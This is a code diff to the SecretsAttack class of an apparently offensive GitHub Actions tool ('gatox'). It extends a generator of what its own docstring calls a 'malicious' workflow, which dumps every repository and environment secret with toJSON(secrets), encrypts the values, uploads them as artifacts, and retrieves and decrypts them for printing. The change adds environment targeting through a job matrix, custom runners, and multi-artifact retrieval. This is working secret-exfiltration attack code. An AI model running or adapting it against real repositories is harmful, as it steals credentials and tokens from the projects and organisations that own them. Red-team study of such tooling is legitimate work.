@@ -70,26 +70,30 @@ class SecretsAttack(Attacker):
         return secret_names
 
     @staticmethod
-    def create_environment_exfil_yaml(pubkey: str, branch_name: str, environment: str):
-        raise NotImplementedError
-
-    @staticmethod
-    def create_exfil_yaml(pubkey: str, branch_name):
+    def create_exfil_yaml(
+        pubkey: str,
+        branch_name: str,
+        environments: list[str] | None = None,
+        runner: list[str] | None = None,
+    ):
         """Create a malicious yaml file that will trigger on push and attempt
         to exfiltrate the provided list of secrets.
 
         Args:
             pubkey (str): Public key to encrypt the plaintext values with.
             branch_name (str): Name of the branch for on: push trigger.
-
+            environments (list[str] | None): Optional list of environments to
+                target via a job matrix.
         """
         yaml_file = {}
 
         yaml_file["name"] = branch_name
         yaml_file["on"] = {"push": {"branches": branch_name}}
 
+        artifact_name = "files-${{ matrix.safe_name }}" if environments else "files"
+
         test_job = {
-            "runs-on": ["ubuntu-latest"],
+            "runs-on": runner or ["ubuntu-latest"],
             "steps": [
                 {
                     "env": {"VALUES": "${{ toJSON(secrets)}}"},
@@ -107,18 +111,29 @@ EOF
                     "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
                     'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
                 },
-                # Upload the encrypted files as workfow run artifacts.
+                # Upload the encrypted files as workflow run artifacts.
                 # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
                 {
                     "name": "Upload artifacts",
                     "uses": "actions/upload-artifact@v4",
                     "with": {
-                        "name": "files",
+                        "name": artifact_name,
                         "path": " |\noutput_updated.json\nlookup.txt",
                     },
                 },
             ],
         }
+
+        if environments:
+            from gatox.attack.oidc.oidc_attack import _sanitize_artifact_suffix
+
+            matrix_include = [
+                {"environment": env, "safe_name": _sanitize_artifact_suffix(env)}
+                for env in environments
+            ]
+            test_job["strategy"] = {"matrix": {"include": matrix_include}}
+            test_job["environment"] = "${{ matrix.environment }}"
+
         yaml_file["jobs"] = {"testing": test_job}
 
         return yaml.dump(yaml_file, sort_keys=False)
@@ -160,23 +175,26 @@ EOF
     async def secrets_dump(
         self,
         target_repo: str,
-        target_branch: str,
-        commit_message: str,
+        target_branch: str | None,
+        commit_message: str | None,
         delete_action: bool,
         yaml_name: str,
         finegrain_scopes: set | None = None,
+        environments: list[str] | None = None,
+        runner: list[str] | None = None,
     ):
         """Given a user with write access to a repository, runs a workflow that
         dumps all repository secrets.
 
         Args:
             target_repo (str): Repository to target.
-            target_branch (str): Branch to create workflow in.
-            commit_message (str): Commit message for exfil workflow.
-            delete_action (bool): Whether to delete the workflow after
-            execution.
+            target_branch (str | None): Branch to create workflow in.
+            commit_message (str | None): Commit message for exfil workflow.
+            delete_action (bool): Whether to delete the workflow after execution.
             yaml_name (str): Name of yaml to use for exfil workflow.
-
+            finegrain_scopes (set | None): Fine-grained PAT scopes if applicable.
+            environments (list[str] | None): Environments to target via job matrix.
+            runner (list[str] | None): Runner labels. Defaults to ubuntu-latest.
         """
         if finegrain_scopes is None:
             finegrain_scopes = set()
@@ -214,7 +232,9 @@ EOF
                 Output.error(f"Remote branch, {branch}, already exists!")
                 return
             priv_key, pubkey_pem = self.__create_private_key()
-            yaml_contents = self.create_exfil_yaml(pubkey_pem, branch)
+            yaml_contents = self.create_exfil_yaml(
+                pubkey_pem, branch, environments, runner
+            )
             workflow_id = await self.execute_and_wait_workflow(
                 target_repo, branch, yaml_contents, commit_message, yaml_name
             )
@@ -223,43 +243,59 @@ EOF
 
             # Retry artifact retrieval - artifacts may not be immediately
             # available after workflow completion
-            res = None
-            for _ in range(30):
-                res = await self.api.retrieve_workflow_artifact(
-                    target_repo, workflow_id
-                )
-                if res and "output_updated.json" in res and "lookup.txt" in res:
-                    break
-                await asyncio.sleep(1)
+            if environments:
+                from gatox.attack.oidc.oidc_attack import _sanitize_artifact_suffix
 
-            if not res or not ("output_updated.json" in res and "lookup.txt" in res):
-                Output.error(
-                    "Failed to retrieve workflow artifact! "
-                    "Artifacts may not have been uploaded."
+                artifact_to_env = {
+                    f"files-{_sanitize_artifact_suffix(env)}": env
+                    for env in environments
+                }
+                expected = set(artifact_to_env.keys())
+                all_artifacts = {}
+                for _ in range(30):
+                    all_artifacts = await self.api.retrieve_all_workflow_artifacts(
+                        target_repo, workflow_id
+                    )
+                    if expected.issubset(all_artifacts.keys()):
+                        break
+                    await asyncio.sleep(1)
+
+                missing = expected - all_artifacts.keys()
+                if missing:
+                    Output.error(
+                        "Artifacts missing for environment(s): "
+                        f"{', '.join(artifact_to_env[m] for m in missing)}"
+                    )
+
+                self.__present_secrets_from_artifacts(
+                    priv_key, all_artifacts, expected - missing
                 )
             else:
-                # Carve files out of the zipfile.
+                artifact = None
+                for _ in range(30):
+                    artifact = await self.api.retrieve_workflow_artifact(
+                        target_repo, workflow_id
+                    )
+                    if (
+                        artifact
+                        and "output_updated.json" in artifact
+                        and "lookup.txt" in artifact
+                    ):
+                        break
+                    await asyncio.sleep(1)
 
-                # lookup.txt is the encrypted AES key
-                # output_updated.json is the AES encrypted json blob
-
-                cleartext = self.__decrypt_secrets(
-                    priv_key, res["lookup.txt"], res["output_updated.json"]
-                )
-                Output.owned("Decrypted and Decoded Secrets:")
-                secrets = json.loads(cleartext)
-
-                # Filter out github_token which is always present
-                extracted = {k: v for k, v in secrets.items() if k != "github_token"}
-
-                if not extracted:
-                    Output.warn(
-                        "No secrets were extracted. Org secrets are not "
-                        "accessible to public repos on the free plan."
+                if not artifact or not (
+                    "output_updated.json" in artifact and "lookup.txt" in artifact
+                ):
+                    Output.error(
+                        "Failed to retrieve workflow artifact! "
+                        "Artifacts may not have been uploaded."
                     )
                 else:
-                    for k, v in extracted.items():
-                        print(f"{k}={v}")
+                    self.__present_secrets_from_artifacts(
+                        priv_key, {"files": artifact}, {"files"}
+                    )
+
             if delete_action and (
                 not finegrain_scopes or "actions:write" in finegrain_scopes
             ):
@@ -271,4 +307,45 @@ EOF
         else:
             Output.error(
                 "The user does not have the necessary scopes to conduct this attack!"
+            )
+
+    def __present_secrets_from_artifacts(
+        self,
+        priv_key,
+        artifacts: dict,
+        names: set,
+    ):
+        """Decrypt artifacts and print de-duplicated secrets.
+
+        Args:
+            priv_key: RSA private key for decryption.
+            artifacts (dict): {artifact_name: {filename: bytes}}
+            names (set): Artifact names to process.
+        """
+        # Collect unique (key, value) pairs across all artifacts
+        seen: set[tuple] = set()
+        any_extracted = False
+
+        Output.owned("Decrypted and Decoded Secrets:")
+        for name in names:
+            files = artifacts.get(name, {})
+            if "output_updated.json" not in files or "lookup.txt" not in files:
+                continue
+            cleartext = self.__decrypt_secrets(
+                priv_key, files["lookup.txt"], files["output_updated.json"]
+            )
+            secrets = json.loads(cleartext)
+            for k, v in secrets.items():
+                if k == "github_token":
+                    continue
+                pair = (k, v)
+                if pair not in seen:
+                    seen.add(pair)
+                    print(f"{k}={v}")
+                    any_extracted = True
+
+        if not any_extracted:
+            Output.warn(
+                "No secrets were extracted. Org secrets are not "
+                "accessible to public repos on the free plan."
             )
